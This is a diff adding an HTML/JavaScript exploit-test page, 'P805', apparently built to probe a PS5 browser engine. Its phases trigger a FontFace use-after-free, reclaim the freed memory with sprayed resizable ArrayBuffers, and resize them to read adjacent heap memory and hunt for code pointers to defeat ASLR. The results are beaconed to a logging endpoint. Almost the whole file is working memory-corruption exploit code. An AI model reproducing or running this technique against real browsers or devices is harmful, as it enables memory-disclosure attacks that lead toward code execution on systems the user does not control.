@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P805 — Resizable AB OOB + Worker test</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P805 — Resizable ArrayBuffer OOB + Worker test
+ *
+ * P804 discovered: ArrayBuffer.prototype.resize EXISTS on PS5.
+ * If resizable ABs expose uninitialized/adjacent heap data
+ * after resize, we get OOB read → vtable → ASLR defeat.
+ *
+ * Also tests: Worker creation + postMessage.
+ *
+ * PHASES:
+ *   A: Create resizable AB, test resize, check for uninit data
+ *   B: UAF + resizable AB reclaim → resize → OOB read
+ *   C: Worker creation + postMessage roundtrip
+ *   D: Large resize + heap scan for code pointers
+ *
+ * CRASH_CLASS: MODERATE — resize might trigger allocator issues
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P805-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P805-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+function getPhase(){
+  try { return localStorage.getItem('p805_phase') || 'A'; } catch(e){ return 'A'; }
+}
+function setPhase(p){
+  try { localStorage.setItem('p805_phase', p); } catch(e){}
+}
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = '';
+
+  var phase = getPhase();
+  if (phase === 'DONE') {
+    b('DONE', 'all_phases_complete');
+    log('All phases complete!');
+    try { localStorage.removeItem('p805_phase'); } catch(e){}
+    return;
+  }
+
+  b('BOOT', 'phase=' + phase);
+  log('P805 — Resizable AB OOB — Phase ' + phase + '\n');
+
+  if (phase === 'A') {
+    phaseA();
+  } else if (phase === 'B') {
+    phaseB();
+  } else if (phase === 'C') {
+    phaseC();
+  } else if (phase === 'D') {
+    phaseD();
+  }
+}
+
+/* ===== PHASE A: Basic resizable AB tests ===== */
+function phaseA() {
+  setPhase('B');
+  var aData = [];
+
+  /* A1: Can we create a resizable AB? */
+  try {
+    var rab = new ArrayBuffer(64, { maxByteLength: 4096 });
+    aData.push('A1:created_bl=' + rab.byteLength + '_mbl=' + rab.maxByteLength);
+    aData.push('A1:resizable=' + rab.resizable);
+  } catch(e) {
+    aData.push('A1:ERR:' + e.message);
+    b('A-RESULT', aData.join('|'));
+    log(aData.join('\n'));
+    setTimeout(function(){ location.reload(); }, 800);
+    return;
+  }
+
+  /* A2: Can we resize up? */
+  try {
+    rab.resize(256);
+    aData.push('A2:resized_to_256_bl=' + rab.byteLength);
+  } catch(e) {
+    aData.push('A2:ERR:' + e.message);
+  }
+
+  /* A3: Check new bytes — zero or uninitialized? */
+  try {
+    var v = new BigUint64Array(rab);
+    var nonzero = [];
+    for (var i = 0; i < v.length; i++) {
+      if (v[i] !== 0n) nonzero.push('q' + i + '=0x' + h16(v[i]));
+    }
+    aData.push('A3:nonzero_after_resize=' + nonzero.length);
+    if (nonzero.length > 0) {
+      aData.push('A3:LEAK!' + nonzero.slice(0, 8).join(','));
+    }
+  } catch(e) {
+    aData.push('A3:ERR:' + e.message);
+  }
+
+  /* A4: Resize down then up — stale data? */
+  try {
+    var v2 = new BigUint64Array(rab);
+    /* Write markers to bytes 64-255 */
+    for (var j = 8; j < 32; j++) v2[j] = BigInt(0xAA00 + j);
+    /* Resize down to 64 */
+    rab.resize(64);
+    aData.push('A4:shrunk_bl=' + rab.byteLength);
+    /* Resize back up to 256 */
+    rab.resize(256);
+    aData.push('A4:regrown_bl=' + rab.byteLength);
+    /* Check if markers survived */
+    var v3 = new BigUint64Array(rab);
+    var survived = 0;
+    for (var k = 8; k < 32; k++) {
+      if (v3[k] === BigInt(0xAA00 + k)) survived++;
+    }
+    aData.push('A4:markers_survived=' + survived + '/24');
+    /* Any NON-marker, non-zero data in regrown region? */
+    var stale = [];
+    for (var m = 8; m < 32; m++) {
+      if (v3[m] !== 0n && v3[m] !== BigInt(0xAA00 + m)) {
+        stale.push('q' + m + '=0x' + h16(v3[m]));
+      }
+    }
+    if (stale.length > 0) aData.push('A4:STALE_DATA!' + stale.join(','));
+    else aData.push('A4:clean_regrow');
+  } catch(e) {
+    aData.push('A4:ERR:' + e.message);
+  }
+
+  /* A5: Large resize — does it work? */
+  try {
+    var rab2 = new ArrayBuffer(16, { maxByteLength: 65536 });
+    rab2.resize(65536);
+    var v4 = new BigUint64Array(rab2);
+    var nz5 = 0;
+    /* Scan for any nonzero qwords in 64KB */
+    for (var p = 0; p < v4.length; p++) {
+      if (v4[p] !== 0n) nz5++;
+    }
+    aData.push('A5:64K_nonzero=' + nz5);
+  } catch(e) {
+    aData.push('A5:ERR:' + e.message);
+  }
+
+  /* A6: Regular AB vs resizable AB — same allocator? */
+  try {
+    /* Create a regular AB(192) and a resizable AB(192, max=8192) */
+    var regAbs = [];
+    var resAbs = [];
+    for (var r = 0; r < 16; r++) regAbs.push(new ArrayBuffer(192));
+    for (var s = 0; s < 16; s++) resAbs.push(new ArrayBuffer(192, { maxByteLength: 8192 }));
+
+    /* Check if resizable property differs */
+    aData.push('A6:reg_resizable=' + regAbs[0].resizable);
+    aData.push('A6:res_resizable=' + resAbs[0].resizable);
+    aData.push('A6:reg_mbl=' + regAbs[0].maxByteLength);
+    aData.push('A6:res_mbl=' + resAbs[0].maxByteLength);
+  } catch(e) {
+    aData.push('A6:ERR:' + e.message);
+  }
+
+  b('A-RESULT', aData.join('|').slice(0, 900));
+  log('Phase A:\n' + aData.join('\n'));
+  setTimeout(function(){ location.reload(); }, 800);
+}
+
+/* ===== PHASE B: UAF + resizable AB reclaim ===== */
+function phaseB() {
+  setPhase('C');
+  var bData = [];
+
+  var st1 = document.createElement('style');
+  st1.textContent = '@font-face{font-family:ws1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st1);
+
+  var face1 = new FontFace('wf1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(face1);
+  void face1.loaded;
+
+  var resAbs = [], fired1 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired1) return undefined;
+      fired1 = true;
+      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+
+      /* Spray with RESIZABLE ABs */
+      for (var k = 0; k < 64; k++) {
+        try {
+          resAbs.push(new ArrayBuffer(192, { maxByteLength: 8192 }));
+        } catch(e) {
+          /* If resizable fails, fall back to regular */
+          resAbs.push(new ArrayBuffer(192));
+        }
+      }
+      try { document.fonts.check('1em ws1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em wf1, ws1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    /* Find reclaimed AB */
+    var best = -1;
+    for (var i = 0; i < resAbs.length; i++) {
+      var v = new BigUint64Array(resAbs[i]);
+      if (v[0] === 1n) { best = i; break; }
+    }
+
+    if (best < 0) {
+      b('B-MISS', 'no_reclaim');
+      bData.push('B:no_reclaim_retrying');
+      setPhase('B');
+      setTimeout(function(){ location.reload(); }, 800);
+      return;
+    }
+
+    var ab = resAbs[best];
+    var view = new BigUint64Array(ab);
+    var self_addr = view[11] - 0x68n;
+    bData.push('B:reclaimed_idx=' + best);
+    bData.push('B:self=0x' + h16(self_addr));
+    bData.push('B:resizable=' + ab.resizable);
+    bData.push('B:mbl=' + ab.maxByteLength);
+    bData.push('B:bl=' + ab.byteLength);
+
+    b('B-RECLAIM', bData.join('|').slice(0, 400));
+
+    /* If resizable, try to resize and read OOB */
+    if (ab.resizable && ab.maxByteLength > 192) {
+      try {
+        /* Resize to 4096 — read adjacent heap! */
+        ab.resize(4096);
+        bData.push('B:resized_to_4096_bl=' + ab.byteLength);
+
+        var vBig = new BigUint64Array(ab);
+        /* Scan qwords 24-511 (bytes 192-4095) for nonzero / code pointers */
+        var nonzero = 0;
+        var codelike = [];
+        var heaplike = [];
+        for (var q = 24; q < vBig.length; q++) {
+          if (vBig[q] !== 0n) {
+            nonzero++;
+            var hi = Number(vBig[q] >> 32n);
+            var lo = Number(vBig[q] & 0xFFFFFFFFn);
+            /* Code range heuristic: upper nibble patterns */
+            if (hi >= 0x00000001 && hi <= 0x0000FFFF && lo !== 0) {
+              heaplike.push('q' + q + '=0x' + h16(vBig[q]));
+            }
+            if ((hi & 0xFFFF0000) === 0 && hi > 0) {
+              codelike.push('q' + q + '=0x' + h16(vBig[q]));
+            }
+          }
+        }
+        bData.push('B:oob_nonzero=' + nonzero);
+        bData.push('B:heaplike=' + heaplike.length);
+        bData.push('B:codelike=' + codelike.length);
+
+        /* Beacon first 20 nonzero qwords from OOB region */
+        var oobVals = [];
+        for (var q2 = 24; q2 < vBig.length && oobVals.length < 20; q2++) {
+          if (vBig[q2] !== 0n) oobVals.push('q' + q2 + '=0x' + h16(vBig[q2]));
+        }
+        if (oobVals.length > 0) {
+          b('B-OOB', oobVals.join('|').slice(0, 900));
+        } else {
+          b('B-OOB', 'all_zero');
+        }
+
+        /* Also dump the original 192B region */
+        var origNz = [];
+        for (var q3 = 0; q3 < 24; q3++) {
+          if (vBig[q3] !== 0n) origNz.push('q' + q3 + '=0x' + h16(vBig[q3]));
+        }
+        b('B-ORIG', origNz.join('|').slice(0, 900));
+
+      } catch(e) {
+        bData.push('B:resize_ERR:' + e.message);
+        b('B-RESIZE-ERR', e.message);
+      }
+    } else {
+      bData.push('B:not_resizable_or_small_mbl');
+      /* Regular AB reclaim — just dump base */
+      var nzOrig = [];
+      for (var q4 = 0; q4 < 24; q4++) {
+        if (view[q4] !== 0n) nzOrig.push('q' + q4 + '=0x' + h16(view[q4]));
+      }
+      b('B-REG', nzOrig.join('|').slice(0, 900));
+    }
+
+    b('B-DONE', bData.join('|').slice(0, 900));
+    log('Phase B:\n' + bData.join('\n'));
+    setTimeout(function(){ location.reload(); }, 800);
+  }, 500);
+}
+
+/* ===== PHASE C: Worker test ===== */
+function phaseC() {
+  setPhase('D');
+  var cData = [];
+
+  /* C1: Can we create a Worker from a blob URL? */
+  try {
+    var workerCode = 'self.onmessage = function(e) { self.postMessage({echo: e.data, ts: Date.now()}); };';
+    var blob = new Blob([workerCode], { type: 'application/javascript' });
+    var blobUrl = URL.createObjectURL(blob);
+    cData.push('C1:blob_url=' + blobUrl.slice(0, 60));
+
+    var w = new Worker(blobUrl);
+    var workerResponded = false;
+
+    w.onmessage = function(e) {
+      workerResponded = true;
+      cData.push('C2:worker_echo=' + JSON.stringify(e.data).slice(0, 100));
+      b('C-WORKER-OK', cData.join('|').slice(0, 900));
+      w.terminate();
+      finishC();
+    };
+
+    w.onerror = function(e) {
+      cData.push('C2:worker_error=' + (e.message || 'unknown'));
+      b('C-WORKER-ERR', cData.join('|').slice(0, 900));
+      finishC();
+    };
+
+    /* Send test message */
+    w.postMessage({ test: 'hello', t: Date.now() });
+    cData.push('C1:message_sent');
+
+    /* Timeout fallback */
+    setTimeout(function() {
+      if (!workerResponded) {
+        cData.push('C2:timeout_no_response');
+        b('C-WORKER-TIMEOUT', cData.join('|').slice(0, 900));
+        try { w.terminate(); } catch(e){}
+        finishC();
+      }
+    }, 3000);
+
+  } catch(e) {
+    cData.push('C1:ERR:' + e.message);
+    b('C-RESULT', cData.join('|').slice(0, 900));
+    finishC();
+  }
+
+  function finishC() {
+    log('Phase C:\n' + cData.join('\n'));
+    setTimeout(function(){ location.reload(); }, 800);
+  }
+}
+
+/* ===== PHASE D: Large resize heap scan ===== */
+function phaseD() {
+  setPhase('DONE');
+  var dData = [];
+
+  /* Create many small objects to fill heap, then resizable AB */
+  try {
+    /* Pre-allocate heap objects with known patterns */
+    var divs = [];
+    for (var i = 0; i < 200; i++) {
+      var d = document.createElement('div');
+      d.className = 'heap_filler_' + i;
+      d.textContent = 'X'.repeat(32);
+      document.body.appendChild(d);
+      divs.push(d);
+    }
+
+    /* Allocate resizable AB */
+    var rab = new ArrayBuffer(16, { maxByteLength: 65536 });
+    dData.push('D1:created_16_max_64K');
+
+    /* Resize to 64KB and scan for patterns */
+    rab.resize(65536);
+    dData.push('D2:resized_to_64K_bl=' + rab.byteLength);
+
+    var view = new BigUint64Array(rab);
+    var nonzero = 0;
+    var patterns = {};
+
+    for (var q = 0; q < view.length; q++) {
+      if (view[q] !== 0n) {
+        nonzero++;
+        var hi = Number(view[q] >> 32n);
+        var bucket = '0x' + (hi >>> 16).toString(16).padStart(4, '0');
+        patterns[bucket] = (patterns[bucket] || 0) + 1;
+      }
+    }
+
+    dData.push('D3:nonzero_qwords=' + nonzero + '/' + view.length);
+
+    /* Report top patterns */
+    var patList = [];
+    for (var pk in patterns) {
+      patList.push(pk + ':' + patterns[pk]);
+    }
+    patList.sort(function(a, b) {
+      return parseInt(b.split(':')[1]) - parseInt(a.split(':')[1]);
+    });
+    dData.push('D4:patterns=' + patList.slice(0, 10).join(','));
+
+    /* Report first 20 nonzero qwords with offsets */
+    var first20 = [];
+    for (var q2 = 0; q2 < view.length && first20.length < 20; q2++) {
+      if (view[q2] !== 0n) {
+        first20.push('q' + q2 + '=0x' + h16(view[q2]));
+      }
+    }
+    b('D-FIRST20', first20.join('|').slice(0, 900));
+
+    /* Clean up */
+    for (var ci = 0; ci < divs.length; ci++) divs[ci].remove();
+
+  } catch(e) {
+    dData.push('D:ERR:' + e.message);
+  }
+
+  b('D-RESULT', dData.join('|').slice(0, 900));
+  log('Phase D:\n' + dData.join('\n'));
+
+  b('DONE', 'all_phases_complete');
+  log('\nAll phases complete!');
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 100);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P805 — Resizable AB OOB — Loading...</pre>
+</body>
+</html>
